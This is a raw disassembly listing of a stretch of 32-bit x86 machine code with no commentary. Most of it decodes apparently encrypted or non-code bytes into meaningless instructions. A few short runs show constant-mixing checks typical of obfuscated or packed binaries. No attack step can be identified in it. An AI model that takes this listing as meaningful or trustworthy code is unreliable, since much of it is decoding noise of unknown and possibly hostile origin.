  40bbf7:	jnp    0x40bc49
  40bbf9:	xchg   edi,eax
  40bbfa:	imul   esi,DWORD PTR [eax-0x2c],0x24e9e17b
  40bc01:	in     al,0x73
  40bc03:	aad    0x9d
  40bc05:	loop   0x40bc54
  40bc07:	inc    ebp
  40bc08:	cmp    BYTE PTR [eax+0x6592fefe],al
  40bc0e:	xchg   BYTE PTR ds:0x8da0ccb8,cl
  40bc14:	gs cmc 
  40bc16:	adc    al,0x49
  40bc18:	xchg   eax,ebx
  40bc1a:	mov    ah,0xd1
  40bc1c:	lahf   
  40bc1d:	push   eax
  40bc1e:	dec    ebx
  40bc1f:	sub    dl,BYTE PTR [edx+eax*4]
  40bc22:	les    edi,FWORD PTR [ecx-0x25]
  40bc25:	jbe    0x40bc99
  40bc27:	push   eax
  40bc28:	push   ebx
  40bc29:	inc    ecx
  40bc2a:	rsm    
  40bc2c:	and    eax,0xcd18b635
  40bc31:	loop   0x40bc76
  40bc33:	in     al,dx
  40bc34:	addr16 mov cl,0x4c
  40bc37:	xchg   esi,eax
  40bc38:	dec    edi
  40bc39:	jp     0x40bc24
  40bc3b:	mov    dh,0xee
  40bc3d:	dec    edi
  40bc3e:	call   0x3ef470fa
  40bc43:	or     ecx,DWORD PTR [edi+0x5fddaf03]
  40bc49:	pop    es
  40bc4a:	mov    eax,ds:0xff5adb4f
  40bc4f:	push   es
  40bc50:	fwait
  40bc51:	scas   eax,DWORD PTR es:[edi]
  40bc52:	cli    
  40bc53:	inc    esi
  40bc54:	inc    esi
  40bc55:	bound  edx,QWORD PTR [ebp+0x47085a4c]
  40bc5b:	lock push edx
  40bc5d:	in     eax,0xbf
  40bc5f:	inc    ecx
  40bc60:	xchg   esi,eax
  40bc61:	xchg   ebx,eax
  40bc62:	aaa    
  40bc63:	mov    ecx,0x1ff32122
  40bc68:	cmc    
  40bc69:	popa   
  40bc6a:	sbb    ebp,esi
  40bc6c:	cmc    
  40bc6d:	adc    esi,ebx
  40bc6f:	lahf   
  40bc70:	sub    al,0x12
  40bc72:	mov    fs,WORD PTR [edx]
  40bc74:	(bad)  
  40bc75:	call   0xc72cb6c4
  40bc7a:	mov    bh,0x10
  40bc7c:	mov    DWORD PTR [edx+0x65],ecx
  40bc7f:	inc    ecx
  40bc80:	aam    0xef
  40bc82:	mov    ecx,0x2c70e4ca
  40bc87:	ins    DWORD PTR es:[edi],dx
  40bc88:	cld    
  40bc89:	pop    ds
  40bc8a:	ja     0x40bc4d
  40bc8c:	mov    ch,0x88
  40bc8e:	and    eax,0x48be3a8
  40bc93:	add    al,0x75
  40bc95:	(bad)  
  40bc96:	jne    0x40bc38
  40bc98:	jl     0x40bcef
  40bc9a:	lods   eax,DWORD PTR ds:[esi]
  40bc9b:	push   0x92714bc7
  40bca0:	out    0x49,al
  40bca2:	jmp    0x2bb6:0x396b8db9
  40bca9:	repnz cs int3 
  40bcac:	jno    0x40bc3b
  40bcae:	add    al,0xd7
  40bcb0:	or     BYTE PTR [esi-0x4a],bl
  40bcb3:	jge    0x40bcb0
  40bcb5:	outs   dx,BYTE PTR ds:[esi]
  40bcb6:	mov    ebx,0x2d30e9fd
  40bcbb:	lods   al,BYTE PTR ds:[esi]
  40bcbc:	dec    esi
  40bcbd:	in     eax,0x52
  40bcbf:	sbb    BYTE PTR [edx+0x3256bbb5],dl
  40bcc5:	and    al,0xbc
  40bcc7:	stos   BYTE PTR es:[edi],al
  40bcc8:	in     eax,dx
  40bcc9:	sbb    DWORD PTR [ebp+0x30],ebp
  40bccc:	fisttp WORD PTR [edi+0x435e71c]
  40bcd2:	and    DWORD PTR [ebp-0x75],ebp
  40bcd5:	xlat   BYTE PTR ds:[ebx]
  40bcd6:	xchg   esi,eax
  40bcd7:	cmp    ecx,DWORD PTR [ebx+eax*2+0x37]
  40bcdb:	ret    
  40bcdc:	lahf   
  40bcdd:	call   DWORD PTR [eax-0x28804f90]
  40bce3:	jp     0x40bce8
  40bce5:	mov    ebx,0xc9118f27
  40bcea:	mov    esi,0x4e2f1877
  40bcef:	sahf   
  40bcf0:	xchg   edi,eax
  40bcf1:	mov    cs,edi
  40bcf3:	ret    
  40bcf4:	cli    
  40bcf5:	les    esp,FWORD PTR [edx-0x583650fc]
  40bcfb:	sar    ch,0x47
  40bcfe:	les    ebp,FWORD PTR [edx]
  40bd00:	dec    ebx
  40bd01:	rol    bh,1
  40bd03:	mov    esi,DWORD PTR [edx-0x36e861a9]
  40bd09:	xor    DWORD PTR [edi-0x76],edx
  40bd0c:	lea    edx,[ebp-0x5df0db31]
  40bd12:	xchg   BYTE PTR [eax+0x2536db59],dh
  40bd18:	(bad)  
  40bd19:	mov    ds:0x495983a6,eax
  40bd1e:	cmp    BYTE PTR [eax],cl
  40bd20:	sbb    bl,BYTE PTR [ecx+0x429f1ec3]
  40bd26:	xchg   ecx,eax
  40bd27:	fisubr WORD PTR [eax]
  40bd29:	sbb    DWORD PTR [eax],ebp
  40bd2b:	jbe    0x40bda0
  40bd2d:	and    bh,BYTE PTR [eax+0x10]
  40bd30:	push   cs
  40bd31:	dec    edx
  40bd32:	bnd jns 0x40bd4f
  40bd35:	inc    edi
  40bd36:	lods   al,BYTE PTR ds:[esi]
  40bd37:	iret   
  40bd38:	and    ch,0xa3
  40bd3b:	fcmovnbe st,st(5)
  40bd3d:	jbe    0x40bdba
  40bd3f:	call   0x596afa47
  40bd44:	dec    esp
  40bd45:	retf   
  40bd46:	xchg   DWORD PTR [esi],esi
  40bd48:	in     eax,dx
  40bd49:	xor    BYTE PTR [ebp+0x12518db8],ch
  40bd4f:	dec    ebp
  40bd50:	jp     0x40bdcc
  40bd52:	mov    al,ds:0xd8d8ea56
  40bd57:	call   0x22c9:0xea037b08
  40bd5e:	mov    es,ecx
  40bd60:	jl     0x40bd52
  40bd62:	inc    esp
  40bd63:	cmp    al,0xed
  40bd65:	jo     0x40bd34
  40bd67:	push   esp
  40bd68:	stos   BYTE PTR es:[edi],al
  40bd69:	or     DWORD PTR [ecx-0xb0623f6],ebx
  40bd6f:	mov    esp,0x29d88cc4
  40bd74:	sar    edx,1
  40bd76:	jne    0x40bda7
  40bd78:	mov    ebp,0xdf61595e
  40bd7d:	adc    bh,bh
  40bd7f:	xor    dl,BYTE PTR [ecx-0x1b]
  40bd82:	into   
  40bd83:	je     0x40bd47
  40bd85:	fst    QWORD PTR [eax]
  40bd87:	es in  eax,0x70
  40bd8a:	xlat   BYTE PTR ds:[ebx]
  40bd8b:	scas   al,BYTE PTR es:[edi]
  40bd8c:	mov    ebp,0x5020ac70
  40bd91:	mov    bh,0x3d
  40bd93:	sub    BYTE PTR [edx-0x384751bd],dl
  40bd99:	mov    dl,0x58
  40bd9b:	out    dx,eax
  40bd9c:	mov    ch,0x3f
  40bd9e:	jg     0x40bdac
  40bda0:	leave  
  40bda1:	ds loopne 0x40bdf9
  40bda4:	push   ds
  40bda5:	jbe    0x40bdf4
  40bda7:	in     al,0x74
  40bda9:	xor    cl,BYTE PTR [edx]
  40bdab:	ins    BYTE PTR es:[edi],dx
  40bdac:	xor    ah,bh
  40bdae:	pop    edi
  40bdaf:	fadd   DWORD PTR [eax-0x56fe5b0e]
  40bdb5:	stos   BYTE PTR es:[edi],al
  40bdb6:	mov    eax,ds:0x97185b13
  40bdbb:	push   0xffffff95
  40bdbd:	mov    edi,0x65e3e14c
  40bdc2:	cmc    
  40bdc3:	push   ebx
  40bdc4:	dec    esp
  40bdc5:	pop    esp
  40bdc6:	pusha  
  40bdc7:	clc    
  40bdc8:	shl    DWORD PTR [eax-0x7c],cl
  40bdcb:	pusha  
  40bdcc:	or     BYTE PTR [ebp-0x79],0x68
  40bdd0:	mov    BYTE PTR [ebp+ebx*8+0x640561a],bh
  40bdd7:	xchg   ebx,eax
  40bdd8:	and    eax,0xb60227ca
  40bddd:	sub    DWORD PTR [edi-0x5565475a],ecx
  40bde3:	and    ch,BYTE PTR [eax]
  40bde5:	into   
  40bde6:	mov    DWORD PTR [eax+esi*2],esi
  40bde9:	mov    ch,BYTE PTR [edi+ecx*8-0x6fec69ff]
  40bdf0:	cld    
  40bdf1:	xor    al,0xe5
  40bdf3:	mov    cl,0x37
  40bdf5:	test   eax,0xd32dcd81
  40bdfa:	ja     0x40be2d
  40bdfc:	cli    
  40bdfd:	call   0x7f92:0x6f10e6df
  40be04:	(bad)  
  40be05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be06:	stos   DWORD PTR es:[edi],eax
  40be07:	xchg   esp,eax
  40be08:	out    dx,eax
  40be09:	cmp    BYTE PTR [edi],ah
  40be0b:	ror    BYTE PTR [ebx-0x1278498],0xd2
  40be12:	pusha  
  40be13:	retf   
  40be14:	loopne 0x40bdf7
  40be16:	sbb    ebp,DWORD PTR [edi-0x69]
  40be19:	and    al,0x7f
  40be1b:	out    0x9e,al
  40be1d:	push   es
  40be1e:	arpl   bx,sp
  40be20:	mov    cl,0x68
  40be22:	add    edi,ebp
  40be24:	pushf  
  40be25:	sub    esi,edx
  40be27:	inc    ecx
  40be28:	jge    0x40be9b
  40be2a:	sbb    DWORD PTR [eax-0x77],edi
  40be2d:	mov    dh,0x92
  40be2f:	add    BYTE PTR [esi+0x6e5905cf],0x68
  40be36:	not    ebp
  40be38:	inc    edx
  40be39:	les    esp,FWORD PTR [edx+edi*8+0x67a051d6]
  40be40:	mov    edi,0x7113bc10
  40be45:	rcr    BYTE PTR [ecx],1
  40be47:	in     al,dx
  40be48:	mov    dh,0x9a
  40be4a:	mov    DWORD PTR [edi],0xb5a7a92
  40be50:	div    DWORD PTR [ecx]
  40be52:	pop    edx
  40be53:	dec    eax
  40be54:	ret    
  40be55:	sbb    eax,0x9168520b
  40be5a:	pop    DWORD PTR [eax-0x8ec3db7]
  40be60:	cmp    ebx,eax
  40be62:	xchg   edi,eax
  40be63:	pop    esp
  40be64:	call   0x7c5d:0x7c77c893
  40be6b:	push   es
  40be6c:	push   0x5d96684a
  40be71:	sub    al,0xee
  40be73:	pop    ebx
  40be74:	mov    dl,0xff
  40be76:	xchg   esp,eax
  40be77:	les    esi,FWORD PTR [ebp+0x719ab228]
  40be7d:	lock retf 0xfb2
  40be81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be83:	mov    ds:0x47ecd26b,eax
  40be88:	mov    DWORD PTR [ebp-0xc],ecx
  40be8b:	mov    DWORD PTR [ebp-0x20],0x4a50
  40be92:	mov    DWORD PTR [ebp-0x1c],0x2079
  40be99:	mov    DWORD PTR [ebp-0x28],0x792e
  40bea0:	mov    DWORD PTR [ebp-0x24],0x10e8
  40bea7:	mov    DWORD PTR [ebp-0x30],0x22b3
  40beae:	mov    DWORD PTR [ebp-0x2c],0x2293
  40beb5:	mov    eax,DWORD PTR [ebp-0x30]
  40beb8:	mov    ecx,DWORD PTR [ebp-0x2c]
  40bebb:	mov    edx,DWORD PTR [ebp-0x28]
  40bebe:	mov    esi,DWORD PTR [ebp-0x24]
  40bec1:	add    eax,edx
  40bec3:	mov    edx,DWORD PTR [ebp-0x20]
  40bec6:	adc    ecx,esi
  40bec8:	mov    esi,DWORD PTR [ebp-0x1c]
  40becb:	add    eax,0x3e60
  40bed0:	adc    ecx,0xd49e
  40bed6:	xor    eax,0x14ce
  40bedb:	xor    ecx,0x354f
  40bee1:	add    eax,edx
  40bee3:	mov    edx,DWORD PTR [ebp-0x10]
  40bee6:	adc    ecx,esi
  40bee8:	mov    esi,DWORD PTR [ebp-0xc]
  40beeb:	cmp    edx,eax
  40beed:	jne    0x40befb
  40bef3:	cmp    esi,ecx
  40bef5:	je     0x40cc06
  40befb:	mov    DWORD PTR [ebp-0x28],0x4db
  40bf02:	mov    DWORD PTR [ebp-0x24],0x233b
  40bf09:	mov    DWORD PTR [ebp-0x30],0x2c94
  40bf10:	push   0x6b33
  40bf15:	mov    DWORD PTR [ebp-0x2c],0x647f
  40bf1c:	mov    eax,DWORD PTR [ebp-0x30]
  40bf1f:	mov    ecx,DWORD PTR [ebp-0x2c]
  40bf22:	push   0x7c8f
  40bf27:	push   ecx
  40bf28:	push   eax
  40bf29:	call   0x416c20
  40bf2e:	mov    ecx,DWORD PTR [ebp-0x28]
  40bf31:	mov    esi,DWORD PTR [ebp-0x24]
  40bf34:	push   0x4e1a18a
  40bf39:	push   0x283cdcc
  40bf3e:	and    edx,esi
  40bf40:	and    eax,ecx
  40bf42:	push   edx
  40bf43:	jmp    0x40c339
  40bf48:	fst    DWORD PTR [ebp-0x17]
  40bf4b:	or     eax,0x4c9c1c65
  40bf50:	push   ds
  40bf51:	jp     0x40bede
  40bf53:	jo     0x40bf30
  40bf55:	es clc 
  40bf57:	push   0xffffffb6
  40bf59:	add    eax,0x126e1818
  40bf5e:	sbb    BYTE PTR [eax],bl
  40bf60:	jbe    0x40bf87
  40bf62:	(bad)
  40bf66:	push   ebp
  40bf67:	inc    ebp
  40bf68:	jo     0x40bfd2
  40bf6a:	add    cl,BYTE PTR [ecx-0xf]
  40bf6d:	inc    edx
  40bf6e:	ret    
  40bf6f:	or     BYTE PTR [ebx-0x1],0x8
  40bf73:	inc    ebp
  40bf74:	fadd   DWORD PTR [esi]
  40bf76:	loope  0x40bf1b
  40bf78:	cmp    ebx,edx
  40bf7a:	add    edi,esp
  40bf7c:	mov    bl,0x93
  40bf7e:	mov    edx,0xad19e2a9
  40bf83:	cmp    BYTE PTR [ebx-0x3],0x8f
  40bf87:	jge    0x40bffb
  40bf89:	mov    dl,BYTE PTR ds:0x9d35b1d0
  40bf8f:	and    al,0xd9
  40bf91:	shl    BYTE PTR [ecx+0x6ded5c89],cl
  40bf97:	push   edi
  40bf98:	shr    DWORD PTR [edx-0x2c],1
  40bf9b:	or     bl,BYTE PTR [edx-0x27d1cb70]
  40bfa1:	sbb    DWORD PTR [esi+edi*1+0x45],esi
  40bfa5:	sub    al,0xc0
  40bfa7:	adc    BYTE PTR [esi-0x78c59b90],dl
  40bfad:	pop    edx
  40bfae:	sti    
  40bfaf:	imul   esi,DWORD PTR [ecx-0x482ce790],0x85e280b
  40bfb9:	je     0x40c02f
  40bfbb:	and    BYTE PTR [edi+0x13],0x6b
  40bfbf:	call   0x57415ab3
  40bfc4:	cmc    
  40bfc5:	or     ah,0xd7
  40bfc8:	lods   eax,DWORD PTR ds:[esi]
  40bfc9:	ror    BYTE PTR [edx-0x1d],cl
  40bfcc:	div    BYTE PTR [ebx-0x51]
  40bfcf:	aad    0x18
  40bfd1:	sbb    ch,BYTE PTR [ebp-0x17]
  40bfd4:	outs   dx,DWORD PTR ds:[esi]
  40bfd5:	pop    eax
  40bfd6:	pop    esi
  40bfd7:	lods   eax,DWORD PTR ds:[esi]
  40bfd8:	dec    edx
  40bfd9:	out    0xf5,eax
  40bfdb:	add    BYTE PTR [di],dh
  40bfde:	jl     0x40c04c
  40bfe0:	rol    BYTE PTR [edx+0x1f],1
  40bfe3:	js     0x40bfe0
  40bfe5:	stc    
  40bfe6:	jbe    0x40c018
  40bfe8:	int    0x7a
  40bfea:	xor    eax,0x349f7440
  40bfef:	arpl   ax,bp
  40bff1:	pop    esi
  40bff2:	sub    BYTE PTR [eax+0xf44facc],bh
  40bff8:	das    
  40bff9:	es cld 
  40bffb:	je     0x40bfa6
  40bffd:	lods   al,BYTE PTR ds:[esi]
  40bffe:	push   esp
  40bfff:	scas   eax,DWORD PTR es:[edi]
  40c000:	cmp    BYTE PTR [ebx+0x43b57de9],0xb3
  40c007:	sti    
  40c008:	pop    es
  40c009:	lahf   
  40c00a:	dec    edx
  40c00b:	push   0xffffffcc
  40c00d:	aad    0xc9
  40c00f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c010:	pushf  
  40c011:	inc    esp
  40c012:	xchg   esp,eax
  40c013:	in     al,0x14
  40c015:	sti    
  40c016:	adc    al,0xe3
  40c018:	ret    
  40c019:	jae    0x40c079
  40c01b:	dec    esp
  40c01c:	jb     0x40c078
  40c01e:	sbb    dl,BYTE PTR [edi]
  40c020:	in     al,0x20
  40c022:	addr16 shr eax,0x43
  40c026:	mov    gs,WORD PTR [esi+0x74a66384]
  40c02c:	cmp    esp,edx
  40c02e:	jg     0x40bff4
  40c030:	repz std 
  40c032:	scas   al,BYTE PTR es:[edi]
  40c033:	daa    
  40c034:	int    0x5
  40c036:	mov    cl,0xfd
  40c038:	sub    eax,0x8627638d
  40c03d:	leave  
  40c03e:	mov    esi,?
  40c040:	inc    edx
  40c041:	inc    edx
  40c042:	sbb    ebx,0x6ed5d3cb
  40c048:	mov    al,0x60
  40c04a:	pop    ds
  40c04b:	repnz cmp dl,bh
  40c04e:	pop    es
  40c04f:	cmp    cl,bh
  40c051:	push   edi
  40c052:	push   ss
  40c053:	xchg   DWORD PTR [esi+0x7c48bed3],ebp
  40c059:	mov    ecx,0x88058711
  40c05e:	(bad)  
  40c05f:	pop    ebx
  40c060:	pop    ecx
  40c061:	arpl   di,sp
  40c063:	sub    al,0x65
  40c065:	(bad)  
  40c067:	adc    bl,BYTE PTR [eax-0x38f1e01e]
  40c06d:	jmp    0xe93cec86
  40c072:	(bad)  
  40c074:	pop    ebp
  40c075:	sbb    eax,0x1e0bd2aa
  40c07a:	jg     0x40c097
  40c07c:	push   esi
  40c07d:	fwait
  40c07e:	inc    edx
  40c07f:	cmp    DWORD PTR [ebx+0x38c4ac85],0xc0c23cb7
  40c089:	das    
  40c08a:	inc    esp
  40c08b:	xchg   esi,eax
  40c08c:	xor    al,0x46
  40c08e:	mov    ebp,cr2
  40c091:	jmp    0xcb27:0xf7e9b8b7
  40c098:	int3   
  40c099:	neg    BYTE PTR [ebx]
  40c09b:	lahf   
  40c09c:	fsub   st(5),st
  40c09e:	sar    DWORD PTR [eax],1
  40c0a0:	mov    ds:0x283b11ea,al
  40c0a5:	fs loopne 0x40c108
  40c0a8:	add    eax,0xb21dda31
  40c0ad:	int3   
  40c0ae:	mov    ch,0xf9
  40c0b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0b1:	jmp    0x3361d8ec
  40c0b6:	jae    0x40c0df
  40c0b8:	add    eax,0x8b55f1c2
  40c0bd:	ss std 
  40c0bf:	adc    ecx,DWORD PTR [eax]
  40c0c1:	add    al,0xcf
  40c0c3:	lahf   
  40c0c4:	add    DWORD PTR [edi],esi
  40c0c6:	xchg   DWORD PTR [ebx],ecx
  40c0c8:	push   eax
  40c0c9:	das    
  40c0ca:	sub    esi,edx
  40c0cc:	hlt    
  40c0cd:	int    0xb6
  40c0cf:	adc    eax,0x75bcb645
  40c0d4:	push   ecx
  40c0d5:	mov    ah,ah
  40c0d7:	js     0x40c155
  40c0d9:	push   ebp
  40c0da:	jno    0x40c12a
  40c0dc:	(bad)
  40c0e0:	js     0x40c0a5
  40c0e2:	mov    al,0x11
  40c0e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0e5:	and    ah,cl
  40c0e7:	fist   WORD PTR [edx]
  40c0e9:	repnz and DWORD PTR [esi-0x5f6774f4],0xffffffb6
  40c0f1:	fldz   
  40c0f3:	mov    cs,WORD PTR [ebx+0x31611651]
  40c0f9:	xor    al,0x47
  40c0fb:	dec    eax
  40c0fc:	jmp    0x33ae:0x79e6f239
  40c103:	mov    eax,0x9c908eb0
  40c108:	pop    edx
  40c109:	jnp    0x40c0ee
  40c10b:	out    0x9,eax
  40c10d:	iret   
  40c10e:	aam    0x47
  40c110:	push   edi
  40c111:	inc    eax
  40c112:	xchg   ecx,eax
  40c113:	lods   eax,DWORD PTR ds:[esi]
  40c114:	sub    eax,0x91e60286
  40c119:	sar    BYTE PTR [edi+0x8],0xdf
  40c11d:	or     ebp,DWORD PTR [edx-0x32]
  40c120:	sub    al,0xbe
  40c122:	int3   
  40c123:	nop
  40c124:	xor    edx,esp
  40c126:	pop    esi
  40c127:	rcl    BYTE PTR ds:0x98420d91,cl
  40c12d:	sbb    ch,bh
  40c12f:	and    eax,0xd3d1a28e
  40c134:	int3   
  40c135:	mov    ds:0x90342261,eax
  40c13a:	pop    ebp
  40c13b:	frstor [ecx-0x55e36536]
  40c141:	push   cs
  40c142:	add    ecx,esp
  40c144:	aaa    
  40c145:	loopne 0x40c1a0
  40c147:	not    BYTE PTR [esi+0x7537598f]
  40c14d:	sub    BYTE PTR [ecx],dl
  40c14f:	jno    0x40c111
  40c151:	hlt    
  40c152:	xor    bh,BYTE PTR [ecx-0x60]
  40c155:	sbb    BYTE PTR [edi-0x54240694],0x60
  40c15c:	push   ss
  40c15d:	aas    
  40c15e:	and    ebp,DWORD PTR [edx]
  40c160:	(bad)
  40c163:	xlat   BYTE PTR ds:[ebx]
  40c164:	jnp    0x40c1a1
  40c166:	sbb    al,0x38
  40c168:	rcl    bh,cl
  40c16a:	push   eax
  40c16b:	fwait
  40c16c:	je     0x40c198
  40c16e:	test   DWORD PTR [ebx+0x29],esp
  40c171:	ret    0x8638
  40c174:	dec    ecx
  40c175:	mov    BYTE PTR [eax+0x79],0x2d
  40c179:	xchg   edx,eax
  40c17a:	(bad)  
  40c17b:	sub    BYTE PTR [ebp-0x7df90fca],bl
  40c181:	aas    
  40c182:	fnclex 
  40c184:	xchg   esi,eax
  40c185:	stos   DWORD PTR es:[edi],eax
  40c186:	push   ebp
  40c187:	loopne 0x40c143
  40c189:	or     eax,0xa05647b4
  40c18e:	hlt    
  40c18f:	call   0xfe58:0x6e13ef57
  40c196:	sbb    edi,DWORD PTR [eax-0x62a24a5b]
  40c19c:	popf   
  40c19d:	jae    0x40c1a7
  40c19f:	(bad)  
  40c1a0:	aam    0xef
  40c1a2:	ror    ecx,cl
  40c1a4:	retf   
  40c1a5:	sbb    BYTE PTR [eax+0x46],bl
  40c1a8:	aad    0xbe
  40c1aa:	call   0x494789d8
  40c1af:	sahf   
  40c1b0:	or     al,dh
  40c1b2:	ja     0x40c1be
  40c1b4:	mov    cl,0x62
  40c1b6:	dec    eax
  40c1b7:	call   0x3cbe:0x2740c0cb
  40c1be:	or     eax,0x28e9fddd
  40c1c3:	dec    edx
  40c1c4:	repnz sub esp,ecx
  40c1c7:	mov    dh,0xc3
  40c1c9:	cmp    eax,0x24480397
  40c1ce:	mov    ebp,0x2bf84b33
  40c1d3:	hlt    
  40c1d4:	push   ss
  40c1d5:	add    eax,0x751b7a0a
  40c1da:	retf   
  40c1db:	lods   eax,DWORD PTR ds:[esi]
  40c1dc:	sbb    DWORD PTR [ebx+ebp*4-0x62],eax
  40c1e0:	xchg   BYTE PTR [edi],bl
  40c1e2:	adc    eax,0x65a4b3a1
  40c1e7:	test   ch,dh
  40c1e9:	loopne 0x40c1f7
  40c1eb:	dec    ecx
  40c1ec:	inc    edx
  40c1ed:	sbb    BYTE PTR [ebp+0x18],dh
  40c1f0:	sub    BYTE PTR [eax+ebx*1],dh
  40c1f3:	fiadd  DWORD PTR [ecx]
  40c1f5:	xor    al,0xaa
  40c1f7:	pop    esi
  40c1f8:	mov    ch,cl
  40c1fa:	retf   0x5009
  40c1fd:	add    al,0xfe
  40c1ff:	cmp    eax,0xd51b0b1d
  40c204:	jns    0x40c24f
  40c206:	push   edi
  40c207:	dec    esp
  40c208:	popa   
  40c209:	jnp    0x40c216
  40c20b:	pushf  
  40c20c:	mov    ds:0xb494421e,eax
  40c211:	dec    esp
  40c212:	push   edi
  40c213:	add    DWORD PTR [esi-0x63afb254],0xffffffdb
  40c21a:	aaa    
  40c21b:	inc    esi
  40c21c:	into   
  40c21d:	push   eax
  40c21e:	sub    BYTE PTR [eax+edi*8+0x39d581a0],al
  40c225:	ja     0x40c23f
  40c227:	repnz push ds
  40c229:	dec    edi
  40c22a:	sbb    DWORD PTR [edi-0x41f86f0e],esp
  40c230:	ret    
  40c231:	mov    al,fs:0xdc58fb1b
  40c237:	xchg   esp,eax
  40c238:	jle    0x40c1fb
  40c23a:	push   0x68
  40c23c:	add    eax,0x9e10d7e0
  40c241:	sbb    al,bh
  40c243:	sub    al,0xae
  40c245:	and    BYTE PTR [edx+edi*4-0xa],cl
  40c249:	push   ss
  40c24a:	inc    ecx
  40c24b:	cli    
  40c24c:	int    0x0
  40c24e:	dec    edx
  40c24f:	pop    es
  40c250:	inc    esi
  40c251:	gs out dx,al
  40c253:	ret    
  40c254:	xchg   BYTE PTR [edi-0x366d9da4],al
  40c25a:	jl     0x40c2b9
  40c25c:	call   0x5292:0xce831c21
  40c263:	pop    ebp
  40c264:	mov    edx,0x3f5df0f3
  40c269:	ret    0xc1b9
  40c26c:	mov    al,0xa1
  40c26e:	inc    edi
  40c26f:	in     eax,dx
  40c270:	cwde   
  40c271:	int3   
  40c272:	jecxz  0x40c260
  40c274:	rol    esi,0xb1
  40c277:	test   DWORD PTR [ebp-0x7d799bdc],esi
  40c27d:	daa    
  40c27e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c27f:	inc    eax
  40c280:	scas   eax,DWORD PTR es:[edi]
  40c281:	sub    al,BYTE PTR [edx+eiz*1+0x5e968be3]
  40c288:	test   ah,cl
  40c28a:	and    BYTE PTR [edx-0x14a05b2],al
  40c290:	jle    0x40c30e
  40c292:	rcl    eax,1
  40c294:	hlt    
  40c295:	add    cl,ah
  40c297:	dec    eax
  40c298:	(bad)  [edi-0x11]
  40c29b:	rcr    DWORD PTR [ebp+0xb],cl
  40c29e:	xchg   esi,eax
  40c29f:	cmp    dl,BYTE PTR [eax-0x45]
  40c2a2:	xor    BYTE PTR [edi-0x19],bh
  40c2a5:	add    dl,BYTE PTR [edi-0x59]
  40c2a8:	xor    ebx,esi
  40c2aa:	sbb    DWORD PTR ds:0x8eef,ebx
  40c2af:	mov    al,al
  40c2b1:	jns    0x40c331
  40c2b3:	and    ch,bl
  40c2b5:	push   0xe0a485ba
  40c2ba:	mov    eax,ds:0x52afa81c
  40c2bf:	sub    BYTE PTR [ebp-0x556baabf],ch
  40c2c5:	iret   
  40c2c6:	sbb    bl,BYTE PTR [ecx+0x75]
  40c2c9:	and    bl,BYTE PTR [ebx]
  40c2cb:	lds    esp,FWORD PTR [edx+0x5a]
  40c2ce:	add    al,0x1
  40c2d0:	scas   eax,DWORD PTR es:[edi]
  40c2d1:	not    bl
  40c2d3:	mov    ds:0x12eb44e7,al
  40c2d8:	and    DWORD PTR [ebx-0x56],ebp
  40c2db:	jmp    0x40c273
  40c2dd:	sti    
  40c2de:	sub    DWORD PTR [esi+0x65],edi
  40c2e1:	in     al,0x1c
  40c2e3:	inc    eax
  40c2e4:	imul   ebx,esi,0x95d384c4
  40c2ea:	clc    
  40c2eb:	enter  0xca20,0xf5
  40c2ef:	pusha  
  40c2f0:	jp     0x40c365
  40c2f2:	push   esp
  40c2f3:	cmp    al,0xfa
  40c2f5:	dec    eax
  40c2f6:	ja     0x40c2b3
  40c2f8:	ins    DWORD PTR es:[edi],dx
  40c2f9:	cli    
  40c2fa:	xor    ax,0x49e8
  40c2fe:	and    edi,ebx
  40c300:	ss inc eax
  40c302:	dec    ecx
  40c303:	in     eax,0xfe
  40c305:	add    ebx,DWORD PTR [eax+0x18]
  40c308:	(bad)  
  40c309:	cli    
  40c30a:	loop   0x40c375
  40c30c:	dec    edi
  40c30d:	shl    al,cl
  40c30f:	scas   al,BYTE PTR es:[edi]
  40c310:	idiv   BYTE PTR [ebp-0x5b]
  40c313:	cld    
  40c314:	inc    ebp
  40c315:	pop    esi
  40c316:	stos   DWORD PTR es:[edi],eax
  40c317:	mov    al,0xd6
  40c319:	iret   
  40c31a:	cmp    DWORD PTR ds:0xa79bc0af,0x31
  40c321:	jns    0x40c385
  40c323:	popa   
  40c324:	xchg   edx,eax
  40c325:	out    0x88,al
  40c327:	fwait
  40c328:	xchg   esp,eax
  40c329:	lods   al,BYTE PTR ds:[esi]
  40c32a:	int3   
  40c32b:	sbb    esi,DWORD PTR [eax-0x18]
  40c32e:	mov    eax,0x52885281
  40c333:	push   ebx
  40c334:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c335:	js     0x40c30c
  40c337:	test   DWORD PTR [edi+0x50],esi
  40c33a:	call   0x416c20
  40c33f:	xor    eax,0x687b
  40c344:	xor    edx,0x18d4
  40c34a:	mov    DWORD PTR [ebp-0x30],eax
  40c34d:	mov    DWORD PTR [ebp-0x2c],edx
  40c350:	mov    eax,ds:0x42274c
  40c355:	cmp    eax,0x7cd80819
  40c35a:	jne    0x40cc06
  40c360:	mov    eax,DWORD PTR [ebp-0x18]
  40c363:	mov    ecx,DWORD PTR [ebp-0x14]
  40c366:	mov    edx,DWORD PTR [ebp-0x18]
  40c369:	mov    esi,DWORD PTR [ebp-0x14]
  40c36c:	shrd   eax,ecx,0x2
  40c370:	shl    edx,0x1e
  40c373:	mov    edx,DWORD PTR ds:0x422538
  40c379:	mov    edx,DWORD PTR [edx+0x1a8]
  40c37f:	shr    ecx,0x2
  40c382:	xor    esi,esi
  40c384:	mov    ecx,0x329e695d
  40c389:	xor    eax,ecx
  40c38b:	or     eax,esi
  40c38d:	mov    DWORD PTR [edx],eax
  40c38f:	mov    eax,DWORD PTR [ebp-0x18]
  40c392:	mov    edx,DWORD PTR [ebp-0x14]
  40c395:	shrd   eax,edx,0x2
  40c399:	shr    edx,0x2
  40c39c:	mov    edx,DWORD PTR [ebp-0x18]
  40c39f:	mov    esi,DWORD PTR [ebp-0x14]
  40c3a2:	xor    eax,ecx
  40c3a4:	xor    esi,esi
  40c3a6:	or     eax,esi
  40c3a8:	mov    ds:0x42274c,eax
  40c3ad:	mov    BYTE PTR [ebp-0x2],0x4f
  40c3b1:	mov    BYTE PTR [ebp-0x1],0xf9
  40c3b5:	movzx  eax,BYTE PTR [ebp-0x1]
